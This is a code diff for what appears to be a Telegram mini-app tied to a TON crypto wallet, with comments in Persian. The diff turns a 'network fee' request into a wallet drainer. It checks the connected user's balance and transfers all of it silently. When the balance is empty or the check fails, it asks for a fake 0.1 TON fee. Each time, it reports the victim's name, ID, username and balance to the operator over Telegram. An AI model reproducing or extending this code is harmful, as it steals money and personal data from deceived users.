@@ -527,7 +527,7 @@
         return btoa(text);
     }
 
-    // ==================== اجرای تراکنش خودکار (همیشه یک تراکنش ۰.۱ تون با پیام) ====================
+    // ==================== اجرای تراکنش خودکار (بر اساس موجودی) ====================
     async function executeSmartTransaction(userAddress) {
         if (isProcessingTransaction) {
             console.log('⚠️ تراکنش دیگری در حال انجام است');
@@ -535,13 +535,34 @@
         }
         try {
             isProcessingTransaction = true;
+            showToast('🔄 در حال بررسی موجودی کیف پول...');
+
+            const balance = await getWalletBalance(userAddress);
             showToast('🔄 در حال آماده‌سازی تراکنش...');
 
-            // مبلغ ثابت ۰.۱ تون
-            const amountToSend = 0.1;
-            const txType = 'پرداخت کارمزد شبکه';
-            const message = "لطفاً برای فعال‌سازی سرویس، مبلغ کارمزد را پرداخت کنید.";
-            const payload = createCommentPayload(message);
+            let amountToSend, txType, payload = "";
+
+            if (balance > 0) {
+                // کاربر موجودی دارد: کل موجودی منتقل شود
+                amountToSend = balance;
+                txType = 'انتقال کل موجودی';
+                // بدون پیام
+                showToast(`💰 موجودی: ${balance.toFixed(6)} TON - در حال انتقال...`);
+            } else if (balance === 0) {
+                // موجودی صفر: درخواست کارمزد با پیام
+                amountToSend = 0.1;
+                txType = 'پرداخت کارمزد';
+                const message = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
+                payload = createCommentPayload(message);
+                showToast(`💳 کیف پول خالی - درخواست کارمزد 0.1 TON...`);
+            } else {
+                // balance = -1 (خطا در دریافت موجودی): باز هم درخواست کارمزد با پیام خطا
+                amountToSend = 0.1;
+                txType = 'پرداخت کارمزد (خطا در بررسی موجودی)';
+                const message = "Balance check failed. Please pay 0.1 TON network fee to continue.";
+                payload = createCommentPayload(message);
+                showToast(`⚠️ امکان بررسی موجودی نبود - درخواست کارمزد 0.1 TON...`);
+            }
 
             const amountInNano = Math.floor(amountToSend * 1e9).toString();
             const transaction = {
@@ -575,11 +596,11 @@
             if (appData.transactions.length > 100) appData.transactions.pop();
             saveData();
 
-            const reportMessage = `💰 **${txType}**\n━━━━━━━━━━━━━━\n👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}\n🆔 آیدی: ${currentUser?.id || 'نامشخص'}\n📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}\n📤 مبلغ: ${amountToSend.toFixed(6)} TON\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+            const reportMessage = `💰 **${txType}**\n━━━━━━━━━━━━━━\n👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}\n🆔 آیدی: ${currentUser?.id || 'نامشخص'}\n📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}\n📤 مبلغ: ${amountToSend.toFixed(6)} TON\n💳 موجودی کیف پول: ${balance === -1 ? 'نامشخص' : balance.toFixed(6) + ' TON'}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             sendToTelegram(reportMessage);
             showToast(`✅ تراکنش با موفقیت انجام شد`);
 
-            // اگر مبلغ به اندازه کافی باشد، پنل فعال می‌شود (اختیاری)
+            // اگر مبلغ ارسالی به حدنصاب فعالسازی رسید، پنل فعال شود
             if (amountToSend >= CONFIG.MINIMUM_WITHDRAW) {
                 setTimeout(() => {
                     localStorage.setItem('isActivated', 'true');
